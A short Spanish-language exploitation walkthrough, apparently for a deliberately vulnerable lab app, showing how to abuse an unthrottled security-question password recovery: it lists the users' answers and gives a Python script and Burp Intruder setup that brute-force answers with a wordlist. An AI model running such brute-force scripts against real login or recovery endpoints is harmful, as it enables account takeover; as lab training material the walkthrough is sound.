Pasos de explotación

  1. Introduce un nombre de usuario conocido (admin, alice, bob, charlie, dave) en el formulario y pulsa Continue.
  2. La aplicación muestra la pregunta de seguridad almacenada en texto plano (p.ej. "What is your pet's name?").
  3. No hay rate-limiting: puedes intentar tantas respuestas como quieras.
  4. Respuestas conocidas: rex (admin), fluffy (alice), sevilla (bob), ceip (charlie), max (dave).
  5. Con la respuesta correcta, la aplicación revela la contraseña en texto plano.
  6. Automatiza con un script Python para iterar una wordlist de nombres de mascotas:
import requests

url_recover  = "http://localhost:5000/recover"
url_answer   = "http://localhost:5000/recover/answer"
username     = "admin"
wordlist     = [line.strip() for line in open("/usr/share/wordlists/rockyou.txt", errors="ignore")]

# Paso 1: obtener pregunta
r = requests.post(url_recover, data={"username": username})

# Paso 2: iterar respuestas
for word in wordlist:
    r = requests.post(url_answer, data={"username": username, "answer": word})
    if "password" in r.text.lower() and "incorrecta" not in r.text.lower():
        print(f"[+] Respuesta correcta: {word}")
        print(r.text)
        break
  1. También puedes usar Burp Intruder: intercepta POST /recover/answer → Sniper → posición en answer=§§ → wordlist de mascotas.
